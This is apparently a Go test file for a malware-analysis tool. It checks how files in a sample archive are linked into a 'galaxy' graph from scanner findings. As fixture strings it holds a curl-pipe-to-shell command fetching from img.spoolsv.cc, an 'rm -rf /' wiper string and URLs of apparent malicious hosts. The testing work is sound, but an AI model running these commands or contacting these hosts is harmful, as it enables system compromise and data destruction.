package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"html/template"
	"os"
	"os/exec"
	"strings"
	"testing"
)

func TestBuildGalaxy_DropperDetection(t *testing.T) {
	// Simulate files from midd.zip
	// update.html contains "https://img.spoolsv.cc/seed.php" -> references seed.php
	files := []FileFindings{
		{
			Path: "/tmp/midd.zip!!555.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/tty", Severity: SeverityNotable},
			},
			Strings: []string{
				"socket", "connect", "recv", "send",
			},
		},
		{
			Path: "/tmp/midd.zip!!seed.php",
			Risk: "suspicious",
			Findings: []FindingForFormula{
				{ID: "objectives/persistence/cron", Severity: SeveritySuspicious},
			},
			Strings: []string{
				"curl -s http://img.spoolsv.cc/snn50.txt|sh",
			},
		},
		{
			Path: "/tmp/midd.zip!!terminal.go",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/credential-access/capture", Severity: SeverityHostile},
			},
			Strings: []string{
				"term.ReadPassword", "AppendFile", "/usr/share/nano/.lock",
			},
		},
		{
			Path: "/tmp/midd.zip!!update.html",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/anti-static/obfuscation", Severity: SeverityNotable},
			},
			Strings: []string{
				"https://img.spoolsv.cc/seed.php", // References seed.php!
			},
		},
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	if len(galaxy.Molecules) != 4 {
		t.Fatalf("expected 4 molecules, got %d", len(galaxy.Molecules))
	}

	// Find molecule indices
	updateIdx, seedIdx := -1, -1
	for i, mol := range galaxy.Molecules {
		if mol.Path == "/tmp/midd.zip!!update.html" {
			updateIdx = i
		}
		if mol.Path == "/tmp/midd.zip!!seed.php" {
			seedIdx = i
		}
	}

	if updateIdx == -1 {
		t.Fatal("update.html molecule not found")
	}
	if seedIdx == -1 {
		t.Fatal("seed.php molecule not found")
	}

	// Check for dropper link: update.html -> seed.php
	foundLink := false
	for _, link := range galaxy.Links {
		if link.From == updateIdx && link.To == seedIdx {
			foundLink = true
			break
		}
	}

	if !foundLink {
		t.Errorf("expected dropper link from update.html (idx %d) to seed.php (idx %d), got links: %+v",
			updateIdx, seedIdx, galaxy.Links)
	}
}

func TestBuildGalaxy_NoSelfReferences(t *testing.T) {
	files := []FileFindings{
		{
			Path: "/archive!!foo.sh",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/shell", Severity: SeverityNotable},
			},
			Strings: []string{
				"foo.sh", // Self-reference should be ignored
				"bar.sh", // References bar.sh
			},
		},
		{
			Path: "/archive!!bar.sh",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/shell", Severity: SeverityNotable},
			},
			Strings: []string{
				"echo hello",
			},
		},
	}

	galaxy := BuildGalaxy(files)

	// Should have link from foo.sh -> bar.sh, but NOT foo.sh -> foo.sh
	for _, link := range galaxy.Links {
		if link.From == link.To {
			t.Errorf("found self-referencing link: %+v", link)
		}
	}

	// Should have exactly one link
	if len(galaxy.Links) != 1 {
		t.Errorf("expected 1 link (foo->bar), got %d: %+v", len(galaxy.Links), galaxy.Links)
	}
}

func TestBuildGalaxy_SingleFile(t *testing.T) {
	files := []FileFindings{
		{
			Path: "/single.exe",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/impact/ransomware", Severity: SeverityHostile},
			},
			Strings: []string{"encrypt", "bitcoin"},
		},
	}

	galaxy := BuildGalaxy(files)

	if galaxy.IsGalaxy {
		t.Error("single file should not be a galaxy")
	}
}

func TestBuildGalaxy_MoleculePositioning(t *testing.T) {
	files := []FileFindings{
		{
			Path:     "/a.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/a", Severity: SeverityNotable}},
			Strings:  []string{},
		},
		{
			Path:     "/b.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/b", Severity: SeverityNotable}},
			Strings:  []string{},
		},
		{
			Path:     "/c.txt",
			Risk:     "notable",
			Findings: []FindingForFormula{{ID: "objectives/test/c", Severity: SeverityNotable}},
			Strings:  []string{},
		},
	}

	galaxy := BuildGalaxy(files)

	if len(galaxy.Molecules) != 3 {
		t.Fatalf("expected 3 molecules, got %d", len(galaxy.Molecules))
	}

	// Check that molecules have different positions
	for i := range galaxy.Molecules {
		for j := i + 1; j < len(galaxy.Molecules); j++ {
			mi, mj := galaxy.Molecules[i], galaxy.Molecules[j]
			if mi.CenterX == mj.CenterX && mi.CenterY == mj.CenterY && mi.CenterZ == mj.CenterZ {
				t.Errorf("molecules %d and %d have same position", i, j)
			}
		}
	}
}

func TestBuildGalaxy_BasenameExtraction(t *testing.T) {
	// Test that we correctly extract basenames from archive paths
	files := []FileFindings{
		{
			Path:     "/tmp/test.zip!!subdir/dropper.sh",
			Risk:     "suspicious",
			Findings: []FindingForFormula{{ID: "objectives/execution/shell", Severity: SeveritySuspicious}},
			Strings:  []string{"./payload.exe", "chmod +x payload.exe"},
		},
		{
			Path:     "/tmp/test.zip!!payload.exe",
			Risk:     "hostile",
			Findings: []FindingForFormula{{ID: "objectives/impact/wiper", Severity: SeverityHostile}},
			Strings:  []string{"rm -rf /"},
		},
	}

	galaxy := BuildGalaxy(files)

	if len(galaxy.Links) != 1 {
		t.Errorf("expected 1 link (dropper.sh -> payload.exe), got %d: %+v", len(galaxy.Links), galaxy.Links)
	}
}

func TestBuildGalaxy_RealMiddZipData(t *testing.T) {
	// This test simulates the actual midd.zip file structure from cleave output
	// terminal.go references update.html in its strings
	// But update.html has no findings, so it won't be in the galaxy
	// This test verifies the behavior with real-world-like data
	files := []FileFindings{
		{
			Path: "/tmp/midd.zip!!555.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/execution/tty", Severity: SeverityNotable},
				{ID: "objectives/anti-analysis/timing", Severity: SeverityNotable},
			},
			Strings: []string{
				"socket", "connect", "recv", "send", "openpty",
			},
		},
		{
			Path: "/tmp/midd.zip!!seed.php",
			Risk: "suspicious",
			Findings: []FindingForFormula{
				{ID: "micro-behaviors/process/create/methods::curl-pipe-sh", Severity: SeveritySuspicious},
				{ID: "objectives/persistence/cron/schedule::curl-s-flag", Severity: SeverityNotable},
			},
			// Note: cleave doesn't extract strings from small PHP files
			Strings: []string{},
		},
		{
			Path: "/tmp/midd.zip!!terminal.go",
			Risk: "hostile",
			Findings: []FindingForFormula{
				{ID: "objectives/credential-access/capture/input::password-exfil-file", Severity: SeverityHostile},
				{ID: "objectives/lateral-movement/supply-chain/impersonation::password-intercept", Severity: SeverityHostile},
			},
			// terminal.go has strings including references to update.html and seed.php
			Strings: []string{
				"io", "github.com/bitfield/script", "golang.org/x/term",
				"os/exec", "strings", "/usr/share/nano/.lock",
				"https://raw.githubusercontent.com/xinfeisoft/vue-element-admin/refs/heads/main/public/update.html",
				"/bin/sh", "-c", "term.ReadPassword",
				// Also add seed.php reference to test cross-file detection
				"http://img.spoolsv.cc/seed.php",
			},
		},
		{
			Path: "/tmp/midd.zip!!sss.mp5",
			Risk: "notable",
			Findings: []FindingForFormula{
				{ID: "objectives/anti-analysis/vm", Severity: SeverityNotable},
			},
			Strings: []string{
				"clock_gettime", "gettimeofday", "CPUID",
			},
		},
		// Note: update.html has no findings in real cleave output, so it's excluded
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	// Should have 4 molecules (update.html excluded because no findings)
	if len(galaxy.Molecules) != 4 {
		t.Fatalf("expected 4 molecules, got %d", len(galaxy.Molecules))
	}

	// Find indices
	terminalIdx, seedIdx := -1, -1
	for i, mol := range galaxy.Molecules {
		switch mol.Path {
		case "/tmp/midd.zip!!terminal.go":
			terminalIdx = i
		case "/tmp/midd.zip!!seed.php":
			seedIdx = i
		}
	}

	if terminalIdx == -1 {
		t.Fatal("terminal.go molecule not found")
	}
	if seedIdx == -1 {
		t.Fatal("seed.php molecule not found")
	}

	// terminal.go references seed.php in its strings
	foundLink := false
	for _, link := range galaxy.Links {
		if link.From == terminalIdx && link.To == seedIdx {
			foundLink = true
			break
		}
	}

	if !foundLink {
		t.Errorf("expected dropper link from terminal.go (idx %d) to seed.php (idx %d), links: %+v",
			terminalIdx, seedIdx, galaxy.Links)
	}

	t.Logf("Galaxy has %d molecules and %d links", len(galaxy.Molecules), len(galaxy.Links))
	for _, link := range galaxy.Links {
		t.Logf("  Link: %s -> %s",
			galaxy.Molecules[link.From].Path,
			galaxy.Molecules[link.To].Path)
	}
}

func TestBuildGalaxy_IntegrationWithCleave(t *testing.T) {
	// This test runs cleave directly on testdata/midd.zip and verifies
	// the galaxy building works with the cleave JSONL format that litmus nests in its response.

	// Skip if cleave not available or traits not configured
	traitsDir := os.Getenv("CLEAVE_TRAITS_DIR")
	if traitsDir == "" {
		t.Skipf("CLEAVE_TRAITS_DIR not set")
	}
	cmd := exec.Command("cleave", "--json", "--validate=false", "analyze", "testdata/midd.zip")
	cmd.Env = append(cmd.Environ(), "CLEAVE_TRAITS_DIR="+traitsDir)
	output, err := cmd.Output()
	if err != nil {
		t.Skipf("cleave not available or failed: %v", err)
	}

	// Parse JSONL output
	var files []FileFindings
	basenames := make(map[string]bool)

	for line := range strings.SplitSeq(string(output), "\n") {
		if line == "" {
			continue
		}

		var record struct {
			Type     string `json:"type"`
			Path     string `json:"path"`
			Risk     string `json:"risk"`
			Findings []struct {
				ID   string `json:"id"`
				Crit string `json:"crit"`
				Kind string `json:"kind"`
			} `json:"findings"`
			Strings []struct {
				Value string `json:"value"`
			} `json:"strings"`
		}

		if err := json.Unmarshal([]byte(line), &record); err != nil {
			continue
		}

		if record.Type != "file" {
			continue
		}

		// Track basenames (handle both "archive!!path" and plain "path" formats)
		path := record.Path
		if strings.Contains(path, "!!") {
			parts := strings.Split(path, "!!")
			path = parts[len(parts)-1]
		}
		basenames[path] = true

		var ff []FindingForFormula
		for _, f := range record.Findings {
			if f.Kind == "structural" || strings.HasPrefix(f.ID, "metadata/internal/") {
				continue
			}
			ff = append(ff, FindingForFormula{
				ID:       f.ID,
				Severity: critToSeverity(f.Crit),
			})
		}

		var strs []string
		for _, s := range record.Strings {
			strs = append(strs, s.Value)
		}

		if len(ff) > 0 {
			files = append(files, FileFindings{
				Path:     record.Path,
				Risk:     record.Risk,
				Findings: ff,
				Strings:  strs,
			})
		}
	}

	t.Logf("Parsed %d files from cleave JSONL", len(files))
	t.Logf("Basenames in archive: %v", basenames)

	for _, f := range files {
		t.Logf("  %s: %d findings, %d strings", f.Path, len(f.Findings), len(f.Strings))
		// Log strings that might reference other files
		for _, s := range f.Strings {
			for basename := range basenames {
				if strings.Contains(s, basename) {
					t.Logf("    String references %s: %s", basename, truncate(s, 80))
				}
			}
		}
	}

	if len(files) < 2 {
		t.Skipf("need at least 2 files with findings for galaxy test, got %d", len(files))
	}

	galaxy := BuildGalaxy(files)

	if !galaxy.IsGalaxy {
		t.Fatal("expected IsGalaxy to be true")
	}

	t.Logf("Galaxy: %d molecules, %d links", len(galaxy.Molecules), len(galaxy.Links))
	for _, link := range galaxy.Links {
		t.Logf("  Link: %s -> %s",
			galaxy.Molecules[link.From].Path,
			galaxy.Molecules[link.To].Path)
	}

	// The test documents the actual behavior - no assertion on link count
	// because it depends on the archive content
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// TestRenderHTMLPage renders a complete HTML page from a zipfile for visual inspection.
// The output is written to testdata/rendered.html which can be opened in a browser.
// Note: this test drives cleave directly to generate the nested cleave JSONL; verdict will
// show UNKNOWN since no litmus classification is provided.
func TestRenderHTMLPage(t *testing.T) {
	zipPath := "testdata/midd.zip"
	if _, err := os.Stat(zipPath); os.IsNotExist(err) {
		t.Skipf("testdata/midd.zip not found")
	}

	traitsDir := os.Getenv("CLEAVE_TRAITS_DIR")
	if traitsDir == "" {
		t.Skipf("CLEAVE_TRAITS_DIR not set")
	}
	if _, err := os.Stat(traitsDir); os.IsNotExist(err) {
		t.Skipf("traits directory not found: %s", traitsDir)
	}

	// Run cleave directly to generate the JSONL that litmus would normally nest in its response.
	cmd := exec.Command("cleave", "--json", "--validate=false", "analyze", zipPath)
	cmd.Env = append(cmd.Environ(), "CLEAVE_TRAITS_DIR="+traitsDir)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		t.Logf("stderr: %s", stderr.String())
		t.Skipf("cleave failed: %v", err)
	}

	// Compute SHA256 of the file
	data, err := os.ReadFile(zipPath)
	if err != nil {
		t.Fatalf("failed to read zipfile: %v", err)
	}
	hash := sha256.Sum256(data)
	sha256Hex := hex.EncodeToString(hash[:])

	// No Classification set — verdict will render as UNKNOWN (no litmus result).
	res := &storedResult{
		Filename: "midd.zip",
		JSON:     stdout.String(),
	}

	// Prepare template data
	resultData := prepareResultData("midd.zip", sha256Hex, res)

	// Log what we got
	t.Logf("Formula: %s", resultData.Formula)
	t.Logf("Verdict: %s", resultData.Verdict)
	t.Logf("Risk: %s", resultData.RiskLevel)
	t.Logf("FileFindings: %d files", len(resultData.FileFindings))

	// Parse the template with required functions
	funcMap := template.FuncMap{
		"mul": func(a, b float64) float64 { return a * b },
	}
	tmpl, err := template.New("result.html").Funcs(funcMap).ParseFiles("templates/base.html", "templates/result.html")
	if err != nil {
		t.Fatalf("failed to parse template: %v", err)
	}

	// Render to buffer
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, resultData); err != nil {
		t.Fatalf("failed to execute template: %v", err)
	}

	// Write to file for visual inspection
	outputPath := "testdata/rendered.html"
	if err := os.WriteFile(outputPath, buf.Bytes(), 0o644); err != nil {
		t.Fatalf("failed to write output: %v", err)
	}

	t.Logf("Rendered %d bytes to %s", buf.Len(), outputPath)
	t.Logf("Open in browser: file://%s", absPath(outputPath))
}

func absPath(path string) string {
	if abs, err := os.Getwd(); err == nil {
		return abs + "/" + path
	}
	return path
}
